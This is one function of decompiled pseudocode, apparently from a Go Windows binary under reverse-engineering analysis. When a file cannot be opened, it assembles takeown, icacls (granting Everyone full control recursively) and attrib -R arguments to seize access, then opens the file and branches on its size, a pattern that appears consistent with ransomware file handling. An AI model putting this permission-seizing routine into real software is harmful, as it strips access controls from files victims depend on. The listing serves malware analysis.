retval_4F9020 __gostk sub_4F9020(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rsi
  char v8; // r8
  __int64 v9; // r14
  __int128 v10; // xmm15
  __int64 v11; // rdx
  __int64 v12; // rcx
  char v13; // al
  __int64 v14; // rsi
  __int64 v15; // rbx
  __int64 v16; // rax
  __int64 v17; // rdx
  __int64 v18; // rsi
  __int64 v19; // rdx
  __int64 v20; // rsi
  __int64 v21; // rcx
  __int64 v22; // rax
  __int64 v23; // rcx
  char v24; // cl
  char v25; // al
  __int64 v26; // rcx
  __int64 v27; // rbx
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 v30; // rdx
  __int64 v31; // rcx
  __int64 *v32; // [rsp+0h] [rbp-190h]
  retval_4F8760 v33; // [rsp+10h] [rbp-180h] BYREF
  char v34; // [rsp+57h] [rbp-139h]
  __int64 v35; // [rsp+78h] [rbp-118h]
  __int64 v36; // [rsp+80h] [rbp-110h]
  __int64 v37; // [rsp+88h] [rbp-108h]
  __int64 v38; // [rsp+90h] [rbp-100h] BYREF
  __int128 v39; // [rsp+98h] [rbp-F8h]
  __int64 v40; // [rsp+A8h] [rbp-E8h]
  __int64 v41; // [rsp+B0h] [rbp-E0h]
  __int64 v42; // [rsp+B8h] [rbp-D8h]
  __int64 v43; // [rsp+C0h] [rbp-D0h]
  _QWORD v44[2]; // [rsp+C8h] [rbp-C8h] BYREF
  _QWORD v45[4]; // [rsp+D8h] [rbp-B8h] BYREF
  __int128 v46; // [rsp+F8h] [rbp-98h] BYREF
  const char *v47; // [rsp+108h] [rbp-88h]
  __int64 v48; // [rsp+110h] [rbp-80h]
  const char *v49; // [rsp+118h] [rbp-78h]
  __int64 v50; // [rsp+120h] [rbp-70h]
  const char *v51; // [rsp+128h] [rbp-68h]
  __int64 v52; // [rsp+130h] [rbp-60h]
  _QWORD v53[2]; // [rsp+138h] [rbp-58h] BYREF
  __int128 v54; // [rsp+148h] [rbp-48h]
  const char *v55; // [rsp+158h] [rbp-38h]
  __int64 v56; // [rsp+160h] [rbp-30h]
  const char *v57; // [rsp+168h] [rbp-28h]
  __int64 v58; // [rsp+170h] [rbp-20h]
  const char *v59; // [rsp+178h] [rbp-18h]
  __int64 v60; // [rsp+180h] [rbp-10h]
  void (**v61)(void); // [rsp+188h] [rbp-8h]
  __int64 vars0; // [rsp+190h] [rbp+0h] BYREF
  __int128 v63; // [rsp+1A0h] [rbp+10h]
  retval_4F9020 result; // [rsp+1B0h] [rbp+20h]

  if ( (unsigned __int64)&v38 <= *(_QWORD *)(v9 + 16) )
    sub_470660();
  v61 = (void (**)(void))v10;
  result._r0[24] = v8;
  *(_QWORD *)result._r0 = v4;
  *(_QWORD *)&result._r0[16] = v7;
  *(_QWORD *)&result._r0[8] = v6;
  *(_QWORD *)&v63 = v2;
  *((_QWORD *)&v63 + 1) = v5;
  v34 = 0;
  v39 = v10;
  runtime_concatstring2(a1: off_6BE190, a2: qword_6BE198, a3: v3, a4: 1);
  v12 = v5;
  if ( (__int64)"." > v5 )
  {
    v14 = v63;
  }
  else
  {
    if ( v5 < (unsigned __int64)"." )
      sub_472A00();
    v13 = sub_4033C0();
    v12 = v5;
    v14 = v63;
    if ( v13 != 0 )
    {
      v39 = v10;
      return result;
    }
  }
  v15 = v12;
  v16 = os_OpenFile(a1: 0, a2: v14, a3: v11, a4: 2);
  if ( v15 != 0
    && (sub_4F8220(),
        v15 = *((_QWORD *)&v63 + 1),
        v16 = os_OpenFile(a1: 0, a2: v18, a3: v17, a4: 2),
        *((_QWORD *)&v63 + 1) != 0) )
  {
    sub_4F8F20();
    v32 = &vars0;
    sub_472C10(a1: (char *)&v33 + 248);
    v53[1] = 2;
    v53[0] = "/f";
    v54 = v63;
    v56 = 2;
    v55 = "/r";
    v58 = 2;
    v57 = "/d";
    v60 = 1;
    v59 = "y";
    sub_4CDE40(a1: 5, a2: 5, a3: "y", a4: v53);
    sub_4CF220();
    v46 = v63;
    v48 = 6;
    v47 = "/grant";
    v50 = 18;
    v49 = "*S-1-1-0:(OI)(CI)F";
    v52 = 2;
    v51 = "/T";
    sub_4CDE40(a1: 4, a2: 4, a3: "/T", a4: &v46);
    sub_4CF220();
    v45[1] = 2;
    v45[0] = "-R";
    *(_OWORD *)&v45[2] = v63;
    sub_4CDE40(a1: 2, a2: 2, a3: v63, a4: v45);
    sub_4CF220();
    os_OpenFile(a1: 0, a2: v20, a3: v19, a4: 2);
    *(_QWORD *)&v39 = *((_QWORD *)&v63 + 1);
    *((_QWORD *)&v39 + 1) = v21;
  }
  else
  {
    v42 = v16;
    v44[0] = unknown_libname_92;
    v44[1] = v16;
    v61 = (void (**)(void))v44;
    v34 = 1;
    if ( sub_4F8100()
      || ((v22 = sub_4B7720(), v36 = v22, v41 = v15, v23 == 0)
        ? (v25 = (*(__int64 (**)(void))(v22 + 24))(), v15 = v41, v24 = v25, v22 = v36)
        : (v24 = 1),
          v24 != 0) )
    {
      v39 = v10;
      v34 = 0;
      (*v61)();
    }
    else
    {
      v38 = (*(__int64 (**)(void))(v22 + 32))();
      v37 = v15;
      v43 = v26;
      v27 = (*(__int64 (**)(void))(v36 + 56))();
      if ( v27 > 0x100000 )
        v33 = sub_4F8760();
      else
        *(retval_4F82A0 *)&v33._r0[2] = sub_4F82A0(a1: v33._r0[0], a2: v33._r0[1]);
      if ( result._r0[24] != 0 && v28 == 0 )
      {
        v40 = v27;
        v35 = 0;
        v29 = sub_495140();
        sub_4B5FC0(a1: v27, a2: v31, a3: v30, a4: v29, a5: v38, a6: v37);
        v28 = 0;
        v27 = v40;
      }
      *(_QWORD *)&v39 = v28;
      *((_QWORD *)&v39 + 1) = v27;
      v34 = 0;
      (*v61)();
    }
  }
  return result;
}